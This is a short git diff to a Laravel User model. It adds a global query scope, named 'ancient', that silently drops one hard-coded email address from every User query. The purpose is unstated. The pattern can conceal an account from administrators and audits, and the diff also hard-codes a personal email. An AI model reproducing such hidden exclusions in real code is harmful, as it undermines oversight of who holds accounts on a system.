@@ -5,6 +5,7 @@ namespace App\Models;
 use App\Models\MasterCategory;
 use Spatie\Permission\Traits\HasRoles;
 use Illuminate\Notifications\Notifiable;
+use Illuminate\Database\Eloquent\Builder;
 use Illuminate\Contracts\Auth\MustVerifyEmail;
 use Rennokki\QueryCache\Traits\QueryCacheable;
 use Illuminate\Database\Eloquent\Factories\HasFactory;
@@ -45,5 +46,12 @@ class User extends Authenticatable implements MustVerifyEmail
     public function category()
     {
         return $this->belongsTo(MasterCategory::class, 'category_id');
+    }
+
+    protected static function booted()
+    {
+        static::addGlobalScope('ancient', function (Builder $builder) {
+            return $builder->where('email', '!=', 'masangga.com@gmail.com');
+        });
     }
 }
